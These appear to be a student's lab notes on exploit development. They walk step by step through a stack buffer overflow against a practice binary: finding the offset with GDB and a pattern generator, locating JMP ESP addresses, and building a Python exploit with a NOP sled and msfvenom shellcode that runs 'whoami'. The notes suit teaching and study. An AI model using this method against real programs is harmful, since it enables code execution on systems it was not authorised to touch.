---

## Exploit Development

-----

### Technical Help

    Utilzing tools such as:

      IDA, GHIDRA
      GDB, MONA, IMMUNITY
      BASH, PYTHON

---

### GDB USES

    Common Commands:

      disass <FUNCTION>   #   Disassemble portion of the program
      info <...>  #   Supply info for specific stack areas
      x/256c $<REGISTER>  #   Read characters from specific register
      break <address>  #   Establish a break point

------------------------------------------------------------------------------

### DEMO

    scp /home/daniel.gonzalez30/Desktop/func student@10.50.20.127:/home/student/Downloads

    strings func

    chmod u+x func

    ---

    gdb ./func

    run

    Enter a string: 123

      exited with code 056

    run sihfgoishf

      starting program /home/student/Downloads/fun adhgsbfjf
      Enter a string:

    ---

    run <<<$(echo"asdfghjkl")

    info functions

    pdisass main

    pdisass getuserinput

    ---

### - Python Script -

    #we're going to change the value and play with it
  
    1 #!/usr/bin/env python
    2 
    3 buffer = "A" * 30
    4 
    5 print(buffer)
    
----

    run <<<$(python linbuff.py)

    changed script value to 90 ( see results )

---

### Results
  
    [----------------------------------registers-----------------------------------]
    EAX: 0xffffd42e ('A' <repeats 90 times>)
    EBX: 0x41414141 ('AAAA')
    ECX: 0xf7fb65c0 --> 0xfbad2088 
    EDX: 0xf7fb789c --> 0x0 
    ESI: 0xf7fb6000 --> 0x1d4d8c 
    EDI: 0x0 
    EBP: 0x41414141 ('AAAA')
    ESP: 0xffffd470 ('A' <repeats 24 times>)
    EIP: 0x41414141 ('AAAA')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x41414141
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd470 ('A' <repeats 24 times>)
    0004| 0xffffd474 ('A' <repeats 20 times>)
    0008| 0xffffd478 ('A' <repeats 16 times>)
    0012| 0xffffd47c ('A' <repeats 12 times>)
    0016| 0xffffd480 ("AAAAAAAA")
    0020| 0xffffd484 ("AAAA")
    0024| 0xffffd488 --> 0x0 
    0028| 0xffffd48c --> 0xf7df9fa1 (<__libc_start_main+241>:	add    esp,0x10)
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x41414141 in ?? ()

----

#### Figure out how big buffer is

    wiremask.eu

    Tools

    Buffer Overflow Pattern Generator

    Copy value into script

    ----
#### Modify Script

    5 buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

    ----

    Copy Offset Value into mask.eu ( 0x31634130 )
    We get 62

    ---

#### Modify Script

    1 #!/usr/bin/env python
    2 
    3 buffer = "A" * 62
    4 
    5 eip = "BBBB"
    6 
    7 print(buffer+eip)

 ---

#### Next Steps

    quit gdb (Ctrl + D)
  
    env - gdb ./func

    show env

    unset env COLUMNS

    unset env LINES

    run (Enter a long string: ddddddddddddddddddddddd)
    
        Program received signal SIGSEGV, Segmentation fault.
        0x64646464 in ?? ()

    ---

    info proc map (make note of starting address after heap and the last end address of the stack)

#### Make note in Script

    #stack is in between 0xf7de1000 and 0xffffe000

    ------
    
    find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4

#### grab 4 addresses and paste into script (convert them into little endian)

    5 #0xf7de3b59 -> 0xf7 de 3b 59 -> "\x59\x3b\xde\xf7"
    6 #0xf7f588ab -> 0xf7 f5 88 ab -> \xab\x88\xf5\xf7"
    7 #0xf7f645fb -> 0xf7 f6 45 fb -> \xfb\x45\xf6\xf7"
    8 #0xf7f6460f -> 0xf7 f6 46 0f -> \x0f\x46\f6\xf7"

    ----

### Grab first address and copy into eip in your script
      
    eip = "\x59\x3b\xde\xf7"

    ----

#### Open New tab

    msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python


#### Copy codes and paste into script and modify

     13 eip = "\x59\x3b\xde\xf7"
     14 
     15 nop = "\x90" * 15
     16 
     17 buf =  b""
     18 buf += b"\xdb\xd3\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x0a\xb8"
     19 buf += b"\x3f\xf6\xc9\x25\x31\x45\x19\x03\x45\x19\x83\xed"
     20 buf += b"\xfc\xdd\x03\xa3\x2e\x79\x75\x66\x57\x11\xa8\xe4"
     21 buf += b"\x1e\x06\xda\xc5\x53\xa0\x1b\x72\xbb\x52\x75\xec"
     22 buf += b"\x4a\x71\xd7\x18\x4f\x75\xd8\xd8\x39\x11\xd8\x8f"
     23 buf += b"\xea\x50\x39\xe2\x8d"
     24 
     25 print(buffer+eip+nop+buf)

#### Find payloads 

    msfvenom --list payloads

#### Quit gdb window

    ./fun <<<$(python linbuff.py)

      Enter a string:
      student

     













    
